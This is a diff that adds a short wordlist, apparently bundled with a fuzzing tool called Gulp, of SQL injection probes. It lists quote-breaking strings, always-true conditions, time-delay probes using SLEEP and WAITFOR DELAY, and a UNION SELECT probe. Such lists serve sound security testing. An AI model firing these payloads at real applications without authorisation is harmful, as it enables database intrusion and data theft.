@@ -1,0 +1,11 @@
+# Gulp bundled wordlist: SQL injection probes (F07 FUZ-011).
+'
+"
+' OR '1'='1
+' OR 1=1--
+" OR "1"="1
+1 OR 1=1
+1' AND SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+1 UNION SELECT NULL--
+')--
